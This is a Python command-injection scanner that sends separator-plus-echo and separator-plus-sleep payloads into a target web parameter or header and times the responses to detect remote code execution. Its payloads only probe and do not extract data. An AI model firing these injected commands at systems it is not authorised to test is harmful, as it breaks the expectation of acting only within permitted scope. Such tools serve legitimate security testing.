#!/usr/bin/env python3
"""cmdi_probe.py — full command-injection matrix: echo + time-based blind.

Stdlib only. Honors HTTP(S)_PROXY / ALL_PROXY env (the ARTEX capture proxy)
and trusts SSL_CERT_FILE when set.

Usage:
  python3 cmdi_probe.py --url 'http://host/check' --param 'ip'
                        [--method POST] [--body '{"ip":"1.2.3.4"}']
                        [--header 'User-Agent' --param-style header]
                        [--os auto|linux|win] [--sleep 3] [--out /tmp/cmdi.json]

The echo marker is generated per run, so a match is unambiguous.
"""
import argparse
import concurrent.futures as cf
import json
import os
import secrets
import statistics
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

TIMEOUT = 15
MAX_BODY = 120_000

SEPS = [";", "|", "||", "&", "`", "$()", "\n", "%0a", "&\n"]


def ctx_ssl():
    ca = os.environ.get("SSL_CERT_FILE") or os.environ.get("CURL_CA_BUNDLE")
    if ca and os.path.exists(ca):
        return ssl.create_default_context(cafile=ca)
    return ssl.create_default_context()


def do_request(url, method, headers, body, ctx):
    data = body.encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in headers:
        req.add_header(k, v)
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as r:
            raw = r.read(MAX_BODY + 1)
            return r.status, raw, time.monotonic() - t0, None
    except urllib.error.HTTPError as e:
        raw = e.read(MAX_BODY + 1)
        return e.code, raw, time.monotonic() - t0, None
    except Exception as e:  # noqa: BLE001
        return None, None, time.monotonic() - t0, "%s: %s" % (type(e).__name__, e)


def inject(url, method, param, body, value, header_mode=False):
    """Return (url, body, headers_override) with the value injected."""
    if header_mode:
        return url, body, {param: value}
    if body is not None:
        try:
            doc = json.loads(body)
            _setkey(doc, param, value)
            return url, json.dumps(doc, ensure_ascii=False), None
        except Exception:
            doc = urllib.parse.parse_qs(body, keep_blank_values=True)
            doc[param] = [value]
            return url, urllib.parse.urlencode(doc, doseq=True), None
    q = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qsl(q.query, keep_blank_values=True)
    for i, (k, _) in enumerate(query):
        if k == param:
            query[i] = (k, value)
            break
    else:
        query.append((param, value))
    return urllib.parse.urlunsplit((q.scheme, q.netloc, q.path,
                                    urllib.parse.urlencode(query, doseq=True), q.fragment)), None, None


def _setkey(doc, key, val):
    if isinstance(doc, dict):
        for k, v in doc.items():
            if k == key and isinstance(v, (str, int, float)):
                doc[k] = val
                return
            _setkey(v, key, val)
    elif isinstance(doc, list):
        for v in doc:
            _setkey(v, key, val)


def cmds_for(sep, marker, os_guess):
    """Yield (label, payload) for one separator."""
    out = []
    if os_guess in ("auto", "linux"):
        out += [
            ("subsh-dollar", "%s$(echo %s)" % (sep, marker)),
            ("subsh-backtick", "%s`echo %s`" % (sep, marker)),
            ("bare-echo", "%secho %s" % (sep, marker)),
        ]
    if os_guess in ("auto", "win"):
        out += [
            ("win-amp-echo", "%secho %s" % (sep, marker)),
        ]
    return out


def sleep_payload(sep, secs, os_guess):
    if os_guess in ("auto", "linux"):
        return "%ssleep %d" % (sep, secs)
    if os_guess == "win":
        return "%stimeout /t %d" % (sep, secs)
    return "%ssleep %d" % (sep, secs)


def run(url, method, param, body, headers, header_mode, os_guess, sleep_secs, ctx):
    marker = "CMDECHO_%s" % secrets.token_hex(8)
    neutral = "1.2.3.4"

    def fire(value, hdr_override=None):
        u, b, ho = inject(url, method, param, body, value, header_mode)
        hs = list(headers)
        if ho:
            hs += list(ho.items())
        status, raw, dt, err = do_request(u, method, hs, b, ctx)
        text = raw.decode("utf-8", "replace") if raw else ""
        return status, text, dt, err

    # baseline timing (neutral value, 5 samples)
    base = []
    for _ in range(5):
        _, _, dt, _ = fire(neutral)
        base.append(dt * 1000.0)
    bmean, bstd = statistics.mean(base), (statistics.pstdev(base) or 0.5)

    results = []

    def probe(sep, label, payload):
        status, text, dt, err = fire(payload)
        echoed = marker in text
        entry = {
            "sep": repr(sep), "label": label, "payload": payload,
            "status": status, "echoed": echoed,
            "ms": round(dt * 1000.0, 1),
        }
        if echoed:
            i = text.find(marker)
            entry["evidence"] = text[max(0, i - 80):i + 80]
        if err:
            entry["error"] = err
        return entry

    with cf.ThreadPoolExecutor(max_workers=3) as ex:
        futs = []
        for sep in SEPS:
            for label, payload in cmds_for(sep, marker, os_guess):
                futs.append((sep, ex.submit(probe, sep, label, payload)))
        for sep, f in futs:
            results.append(f.result())

    echo_seps = sorted({r["sep"] for r in results if r["echoed"]})

    # time-based blind pass for separators without echo (or all if --blind)
    timing = []
    for sep in SEPS:
        payload = sleep_payload(sep, sleep_secs, os_guess)
        status, text, dt, err = fire(payload)
        delta_ms = dt * 1000.0 - bmean
        timing.append({
            "sep": repr(sep), "payload": payload, "status": status,
            "ms": round(dt * 1000.0, 1), "delta_ms": round(delta_ms, 1),
            "blind_signal": delta_ms >= max(3 * bstd, 2500.0),
            "error": err,
        })

    blind_seps = [t["sep"] for t in timing if t["blind_signal"]]
    if echo_seps:
        verdict = "ECHO_RCE"
    elif blind_seps:
        verdict = "BLIND_RCE"
    else:
        verdict = "NO_SIGNAL"
    return {
        "url": url, "param": param, "os_guess": os_guess,
        "marker": marker,
        "baseline_ms": {"n": len(base), "mean": round(bmean, 1), "std": round(bstd, 1)},
        "verdict": verdict,
        "echo_seps": echo_seps, "blind_seps": blind_seps,
        "echo_results": results, "timing_results": timing,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--method", default="GET")
    ap.add_argument("--body", default=None)
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--header-mode", action="store_true",
                    help="--param names a HEADER to inject into (e.g. User-Agent)")
    ap.add_argument("--os", default="auto", choices=["auto", "linux", "win"])
    ap.add_argument("--sleep", type=int, default=3)
    ap.add_argument("--out", default=None)
    a = ap.parse_args()

    headers = []
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers.append((k.strip(), v.strip()))
    if not any(k.lower() == "content-type" for k, _ in headers) and a.body:
        headers.append(("Content-Type", "application/json"))

    out = run(a.url, a.method.upper(), a.param, a.body, headers, a.header_mode,
              a.os, a.sleep, ctx_ssl())
    s = json.dumps(out, ensure_ascii=False, indent=1)
    print(s)
    if a.out:
        with open(a.out, "w", encoding="utf-8") as f:
            f.write(s)


if __name__ == "__main__":
    main()
